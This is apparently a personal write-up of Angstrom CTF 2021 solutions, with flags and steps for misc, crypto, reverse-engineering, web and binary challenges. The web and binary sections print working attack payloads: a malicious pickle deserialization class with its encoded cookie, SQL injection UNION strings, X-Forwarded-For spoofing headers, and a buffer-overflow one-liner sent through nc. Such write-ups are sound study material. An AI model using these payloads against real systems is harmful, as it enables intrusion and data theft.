# **Angstrom CTF 2021 - Writeups**

## Misc

### 1) Sanity Check
* Flag : `actf{always_gonna_give_you_up}`
* The flag was there in the channel topic text in `#general` channel in their Discord server

### 2) Archaic
* Flag : `actf{thou_hast_uncovered_ye_ol_fleg}`
* Commands used to get the flag:

    ```bash
    $ mkdir angCTF

    $ cp /problems/2021/archaic/archive.tar.gz /angCTF

    $ cd angCTF

    $ tar -x -f archive.tar.gz

    $ chmod 777 flag.txt

    $ cat flag.txt
    ```

### 3 Fish
* Flag : `actf{in_the_m0rning_laughing_h4ppy_fish_heads_in_th3_evening_float1ng_in_your_soup}`

* First downloaded the image fish.png

* Ran strings, binwalk, file , exiftool, steghide but no luck :(

* Thought of running a steganography test on the image

* Downloaded `stegsolve.jar` and ran using `java -jre stegsolve.jar` and opened the image.

* The flag was found in the XOR type of the image.

### 4 Survey
* Flag: `actf{roly_poly_fish_heads_are_never_seen_drinking_cappuccino_in_italian_restaurants_with_oriental_women_yeah}`

* Fill the survey you get the flag, its that simple

## Crypto

### 1) Relatively Simple Algorithm
* Flag: `actf{old_but_still_good_well_at_least_until_quantum_computing}`

* Used online decryption tool : `https://asecuritysite.com/encryption/rsa12_2` and got the flag

### 2) Exclusive Cipher
* Flag: `actf{who_needs_aes_when_you_have_xor}`

* Used online XOR Cipher decryption : `https://dcode.fr/en` got a message : `Congratulations on decrypting the message! The flag is actf{who_needs_aes_when_you_have_xor}. Good luck on the other crypto!` which has the flag.

### 4) sosig
* Flag: `actf{d0ggy!!!111!1}`

* Used RsaCtfTool to decipher
* Commands used :

```bash
$ ./RsaCtfTool.py --createpub -n 14750066592102758338439084633102741562223591219203189630943672052966621000303456154519803347515025343887382895947775102026034724963378796748540962761394976640342952864739817208825060998189863895968377311649727387838842768794907298646858817890355227417112558852941256395099287929105321231423843497683829478037738006465714535962975416749856785131866597896785844920331956408044840947794833607105618537636218805733376160227327430999385381100775206216452873601027657796973537738599486407175485512639216962928342599015083119118427698674651617214613899357676204734972902992520821894997178904380464872430366181367264392613853 -e 1565336867050084418175648255951787385210447426053509940604773714920538186626599544205650930290507488101084406133534952824870574206657001772499200054242869433576997083771681292767883558741035048709147361410374583497093789053796608379349251534173712598809610768827399960892633213891294284028207199214376738821461246246104062752066758753923394299202917181866781416802075330591787701014530384229203479804290513752235720665571406786263275104965317187989010499908261009845580404540057576978451123220079829779640248363439352875353251089877469182322877181082071530177910308044934497618710160920546552403519187122388217521799`
```

* Then transferred the publickey to a file called question.pub

```bash
$ ./RsaCtfTool.py --publickey ./question.pub --uncipher 13067887214770834859882729083096183414253591114054566867778732927981528109240197732278980637604409077279483576044261261729124748363294247239690562657430782584224122004420301931314936928578830644763492538873493641682521021685732927424356100927290745782276353158739656810783035098550906086848009045459212837777421406519491289258493280923664889713969077391608901130021239064013366080972266795084345524051559582852664261180284051680377362774381414766499086654799238570091955607718664190238379695293781279636807925927079984771290764386461437633167913864077783899895902667170959671987557815445816604741675326291681074212227 --attack wiener`
```

##  Rev

### 1) Free Flags!!1!!
* Flag: `actf{what_do_you_mean_bananas_arent_animals}`
* Downloaded the executable file
* Ran strings on the file : `strings free_flags`
* Got an idea that it accepted one integer , two integers , one string. Moreover the compared string was printed out to be `banana`
* Installed ghidra and opened the executable and checked out the main function
* For first question, the input was compared to `0x7a69` which is hexadecimal and its decimal equivalent is `31337` which was the answer
* For second question, the sum of inputs was compared to `0x476` which in decimal is `1142` and their product was compared to `0x49f59` which in decimal is `302937`. With basic maths we get to know that the numbers are `723` and `419`
* For the third question, the input string was compared to `banana` which gives our third answer


## Web

### 1) Jar
* Flag: `actf{you_got_yourself_out_of_a_pickle}`
* Checked for XSS vulnerabilities - yes it worked
* Intercepted url using BurpSuite and saw the hint which said pickle has some vulnerability where when it unloads data it doesnt check for the authentcity of it (i.e it doesnt check if any malicious stuff is passed into it)
* Took advantage of that and created a python script which returns a base64 encoded payload
* Before that, checked the source and got to know that the flag is stored inside the environment variable called `Flag` so I had to make a payload which would extract the Flag env variable
* The script:
```python
import pickle
import os
import base64

cmd = 'ls'
class MyEvilPickle(object):
  def __reduce__(self):
    #return (os.system, (cmd), ) z
    return(os.getenv, ('FLAG', ))
if __name__ == '__main__':
    pickled = pickle.dumps(MyEvilPickle())
    print(base64.urlsafe_b64encode(pickled))
```
* This returned a payload : `b'gASVHAAAAAAAAACMAm9zlIwGZ2V0ZW52lJOUjARGTEFHlIWUUpQu'` we are more interested in the string so `gASVHAAAAAAAAACMAm9zlIwGZ2V0ZW52lJOUjARGTEFHlIWUUpQu`

* After the payload, intercepted their website on the home route ('/') and passed in the payload into the Cookie like this:
* `Cookie:contents=gASVHAAAAAAAAACMAm9zlIwGZ2V0ZW52lJOUjARGTEFHlIWUUpQu`
* This lead to the flag printed letter by letter in response
* Thanks for coming to my TedTalk

## 2) Sea of Quills
* Flag: `actf{and_i_was_doing_fine_but_as_you_came_in_i_watch_my_regex_rewrite_f53d98be5199ab7ff81668df}`
* Checked the website for sql injections, was successful running `limit=100&offset=1&cols=*` from burpsuite
* Checked if I could do any union injections
* Luckily this worked `limit=100&offset=1&cols=tbl_name+FROM+sqlite_master+UNION+SELECT+null` this returned the table names `flagtable` and `quills` so going by the names mostly the flag is inside `flagtable`
* Since I know know the flagtable, I printed out everything inside the table : `limit=100&offset=1&cols=*+FROM+flagtable+UNION+SELECT+NULL`

* Website for reference: `https://book.hacktricks.xyz/pentesting-web/sql-injection`

<!-- tbl_name+FROM+sqlite_master+UNION+SELECT+GROUP_CONCAT(0x7c,schema_name,0x7c),2,3+FROM+information_schema.schemata -->

## 3) Spoofy
* Flag: `actf{spoofing_is_quite_spiffy}`

* We reach `https://actf-spoofy.herokuapp.com` here we see that theres a message `I don't trust you` well we get nothing much from here.

* Checked the source and the only important stuff I see is :
```py
if "X-Forwarded-For" in request.headers:
        # https://stackoverflow.com/q/18264304/
        # Some people say first ip in list, some people say last
        # I don't know who to believe
        # So just believe both
        ips: List[str] = request.headers["X-Forwarded-For"].split(", ")
        if not ips:
            return text_response("How is it even possible to have 0 IPs???", 400)
        if ips[0] != ips[-1]:
            return text_response(
                "First and last IPs disagree so I'm just going to not serve this request.",
                400,
            )
        ip: str = ips[0]
        if ip != "1.3.3.7":
            return text_response("I don't trust you >:(", 401)
        return text_response("Hello 1337 haxx0r, here's the flag! " + FLAG)
    else:
        return text_response("Please run the server through a proxy.", 400)

```

* Immediately I see that its a XFF header attack and after seeing the code we basically have to send IPs via XFF header and to get the flag the first item in the array and the last item in the array should be the same IP and that IP should be 1.3.3.7

* Straightforward right? WRONG

* But basically I tried multiple stuff like this : `X-Forwarded-For: 1.3.3.7` or `X-Forwarded-For: 1.3.3.7 8.8.8.8 1.3.3.7` etc etc but no luck. Since 
the headers we are providing are getting appended before our own IP
i.e something like this `1.3.3.7 X.X.X.X` or `X-Forwarded-For: 1.3.3.7 8.8.8.8 1.3.3.7 X.X.X.X` (assuming X.X.X.X is our IP)

* Somehow we had to append a 1.3.3.7 after our IP. So I thought that why not send another XFF header after the previous one. I was right. _partially_

* I tried something like this

```
X-Forwarded-For: 1.3.3.7
X-Forwarded-For: 1.3.3.7
```
* This should work right? Technically yeah since the output array after first XFF would be `1.3.3.7, X.X.X.X` and after our second header it will be `1.3.3.7, X.X.X.X, 1.3.3.7`  the first IP = last IP = 1.3.3.7 problem solved! Well not so easily. The result would be something like this 
`1.3.3.7, X.X.X.X,1.3.3.7` (which makes sense since there is no space between). This is where the split(', ') thing comes into play and splits on basis of comma
(note the space after the comma).

* To tackle this, just send another IP in the second request. Something like this : 
```
X-Forwarded-For: 1.3.3.7
X-Forwarded-For: 1.3.3.7, 1.3.3.7
```
and thats it this is the final payload or should I say headers which fetched us the flag



## Binary

### 2) Tranquil
* Flag: `actf{time_has_gone_so_fast_watching_the_leaves_fall_from_our_instruction_pointer_864f647975d259d7a5bee6e1}`
* Seeing the source I thought that the problem might be of buffer overflow since it was accepting a passoword of 64 bytes
* Checked where the program was going into a segmentation fault , it came out to be at 72 characters
* This confirmed that buffer overflow can be done
* Used `readelf -s tranquil | grep -i "win"` to check out the win function's address (pointer address) and noted the address for the win function which was a hexadecimal address : `0000000000401196`
* Used python to convert this hex address to binary using little-endian byte order

```py
import struct
struct.pack('<I',0x0000000000401196)
```

or

```py
import pwn
pwn.p32(0x0000000000401196)
```

* This code returned the address in binary for the win function which was  `b'\x96\x11@\x00'` we just needed the binary address `\x96\x11@\x00`

* Now we know that Segmentation Fault occurs at 72 and we have an address which is `\x96\x11@\x00` so I used python to printout the characters into the server using the command

```bash
python2 -c "print 'A'*72 + '\x96\x11@\x00'" | nc shell.actf.co 21830
```
* This returned the flag

